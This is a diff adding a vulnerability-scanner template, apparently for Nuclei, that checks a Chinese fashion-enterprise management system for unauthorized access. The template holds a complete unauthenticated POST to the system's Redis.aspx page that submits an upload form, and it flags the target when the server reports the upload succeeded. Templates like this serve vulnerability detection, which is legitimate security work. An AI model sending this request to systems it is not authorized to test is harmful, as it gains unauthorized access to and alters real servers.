@@ -1,0 +1,25 @@
+id: 91-erp-Redis-Unauthorized
+info:
+  name: 西安九佳易信息资讯有限公司时尚企业管理系统未授权访问
+  author: lemonlove7
+  severity: medium
+http:
+  - raw:
+      - |-
+        POST /XiTong/Redis.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 623
+        
+        __VIEWSTATE=%2FwEPDwUJMjE5NTE0MjgzZGSiepd7EcIwOonhBhoATNlpVbzP%2Fhe8AwxiLE%2FKes8Q0g%3D%3D&__VIEWSTATEGENERATOR=EF98E429&__EVENTVALIDATION=%2FwEdAA1neCnb%2B5n3%2FWqC9a4Ya3YsESCFkFW%2FRuhzY1oLb%2FNUVB2nXP6dhZn6mKtmTGNHd3PN%2BDvxnwFeFeJ9MIBWR6937hv76BH8vu7iM4tkb8en1WsXuBX6KwpkP5i5T%2FPF3HM%2FWMskeKo19Gyidl%2Bm11dTINSKM4JLUqVgmaugjcPo1uWw6g9beu%2F2J%2F0raZOGI2GNQKHQlK%2B%2FPdbCL51rlkihLYs0kNxQz8%2BI4QZL2jaBNbqj351j4y4RhrTnxCpB%2F1UNkgKL5vArQjBCQeo4r65iHzmzH0LzpIXvSRNGXJzxvXUx%2FLjN6HpFrtEdxsKt%2FOY%3D&TextBox1=test&TextBox2=test&Button1=%E4%B8%8A%E4%BC%A0&TextBox3=&TextBox4=&TextBoxRemove=&TextBox5=&TextBox6=&TextBox7=
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - alert('上传成功')
+          - RemoveRedis
+    matchers-condition: and
